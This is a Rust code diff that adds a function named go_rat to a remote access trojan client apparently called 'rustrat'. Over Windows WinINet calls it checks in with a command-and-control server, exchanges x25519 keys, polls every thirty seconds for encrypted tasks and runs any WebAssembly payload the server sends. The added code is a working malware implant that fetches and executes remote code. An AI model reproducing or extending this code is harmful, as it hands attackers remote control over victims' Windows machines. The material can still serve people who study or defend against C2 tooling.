@@ -3,11 +3,19 @@
 pub mod error;
 
 use crate::ffi::{FfiType, FnTable, GetLastError, Win32FfiTypes};
+use crate::run_webassembly;
 
+use rustrat_common::encryption;
+use rustrat_common::messages as common_messages;
+use rustrat_prng_seed::get_rand_seed;
+
+use base64;
 use libffi::middle::arg;
+use rand::{rngs, Rng, SeedableRng};
 use std::ffi::CString;
 use std::os::raw::c_void;
-use std::ptr;
+use std::{ptr, str};
+use x25519_dalek;
 
 pub struct InternetHandle<'a> {
     // TODO Arc<RwLock<FnTable>>?
@@ -68,10 +76,11 @@ impl<'a> InternetHandle<'a> {
         Ok(InternetHandle { fn_table, handle })
     }
 
+    // TODO NEXT, make sure things that are pointed to do not go out of scope
     pub fn create_url_handle(
         &self,
         url: CString,
-        headers: Option<CString>,
+        headers: Option<&CString>,
         flags: InternetUrlFlags,
     ) -> error::Result<InternetUrlHandle> {
         let handle: *mut c_void;
@@ -107,6 +116,7 @@ impl<'a> InternetHandle<'a> {
 }
 
 impl<'a> InternetUrlHandle<'a> {
+    // TODO allow passing dwInfoLevel flags to HttpQueryInfoA get specific information
     pub fn get_response_headers(&self) -> error::Result<Vec<u8>> {
         let chunk_size = 0xffff;
         let mut out: Vec<u8> = Vec::with_capacity(chunk_size);
@@ -282,4 +292,134 @@ pub fn register_wininet_fns(fn_table: &mut FnTable) -> error::Result<()> {
     )?;
 
     Ok(())
+}
+
+// TODO This function is meant as a small POC, quick'n'dirty. Should be reworked, possibly moved and more. Should probably not panic (at least this much)
+pub fn go_rat(url: String, server_public_key: encryption::PublicKey) {
+    let mut fn_table = FnTable::new();
+    register_wininet_fns(&mut fn_table).unwrap();
+
+    let internet_handle = InternetHandle::create(
+        &fn_table,
+        CString::new(format!("rustrat-client/{}", env!("CARGO_PKG_VERSION"))).unwrap(),
+    )
+    .unwrap();
+
+    // TODO waiting x25519_dalek version 2, https://github.com/dalek-cryptography/x25519-dalek/pull/64
+    //let private_key = x25519_dalek::EphemeralSecret::new(rngs::StdRng::from_seed(get_rand_seed()));
+
+    // TODO keys will now reside in memory, do we need to do something about that?
+    let mut rng = rngs::StdRng::from_seed(get_rand_seed());
+    let mut private_key: encryption::PrivateKey = [0u8; 32];
+    rng.fill(&mut private_key);
+
+    let rat_private_key = x25519_dalek::StaticSecret::from(private_key);
+    let rat_public_key = x25519_dalek::PublicKey::from(&rat_private_key).to_bytes();
+    let server_public_key = x25519_dalek::PublicKey::from(server_public_key);
+    let rat_shared_secret =
+        encryption::get_shared_key(rat_private_key.to_bytes(), server_public_key.to_bytes());
+
+    let public_key_b64 = base64::encode_config(rat_public_key, base64::URL_SAFE_NO_PAD);
+
+    let checkin_request = internet_handle
+        .create_url_handle(
+            CString::new(url.clone()).unwrap(),
+            Some(&CString::new("Cookie: uid=".to_owned() + &public_key_b64).unwrap()),
+            InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
+                | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
+                | InternetUrlFlags::INTERNET_FLAG_RELOAD,
+        )
+        .unwrap();
+
+    let checkin_headers = str::from_utf8(&checkin_request.get_response_headers().unwrap())
+        .unwrap()
+        .to_lowercase();
+    if !checkin_headers.contains("200 ok") {
+        panic!("Checkin unsuccessful");
+    }
+
+    let checkin_body = checkin_request.get_response().unwrap();
+    let checkin_encrypted_response: common_messages::server_to_rat::Message =
+        common_messages::deserialize(&checkin_body).unwrap();
+
+    let checkin_response = match checkin_encrypted_response {
+        common_messages::server_to_rat::Message::EncryptedMessage(msg) => {
+            match msg.to_response(rat_shared_secret) {
+                std::result::Result::Ok(response) => response,
+                std::result::Result::Err(_) => panic!("Unable to decrypt response from server"),
+            }
+        }
+    };
+
+    match checkin_response {
+        common_messages::server_to_rat::Response::CheckinSuccessful => {
+            log::info!(
+                "Checked in to C2 server with public key {:?}",
+                rat_public_key
+            );
+        }
+        _ => panic!("Server returned with something other than CheckinSuccessful"),
+    }
+
+    loop {
+        let request = common_messages::rat_to_server::Request::GetPendingTask.to_encrypted_message(
+            rat_public_key,
+            rat_shared_secret,
+            &mut rng,
+        );
+
+        let msg = match request {
+            std::result::Result::Ok(request) => base64::encode_config(
+                common_messages::serialize(
+                    &common_messages::rat_to_server::Message::EncryptedMessage(request),
+                )
+                .unwrap(),
+                base64::URL_SAFE_NO_PAD,
+            ),
+            std::result::Result::Err(_) => panic!("Unable to encrypt message"),
+        };
+
+        let task_request = internet_handle
+            .create_url_handle(
+                CString::new(url.clone() + "/renew?t=" + &msg).unwrap(),
+                None,
+                InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
+                    | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
+                    | InternetUrlFlags::INTERNET_FLAG_RELOAD,
+            )
+            .unwrap();
+
+        let task_response = task_request.get_response().unwrap();
+        if task_response.len() > 0 {
+            let msg: common_messages::server_to_rat::Message =
+                common_messages::deserialize(&task_response).unwrap();
+            let response = match msg {
+                common_messages::server_to_rat::Message::EncryptedMessage(encrypted_msg) => {
+                    match encrypted_msg.to_response(rat_shared_secret) {
+                        std::result::Result::Ok(response) => response,
+                        std::result::Result::Err(_) => {
+                            panic!("Unable to decrypt message from server")
+                        }
+                    }
+                }
+            };
+
+            match response {
+                common_messages::server_to_rat::Response::Task(task) => match task {
+                    common_messages::server_to_rat::Task::WebAssemblyTask { wasm, fn_name } => {
+                        log::debug!(
+                            "Running function {} from WASM blob sent by C2 server",
+                            fn_name
+                        );
+                        run_webassembly(wasm, &fn_name).unwrap();
+                    }
+                },
+                common_messages::server_to_rat::Response::NoTasks => {}
+                common_messages::server_to_rat::Response::Exit => panic!("Server sent exit"),
+                _ => todo!(),
+            }
+        }
+
+        std::thread::sleep(std::time::Duration::from_secs(30));
+    }
 }
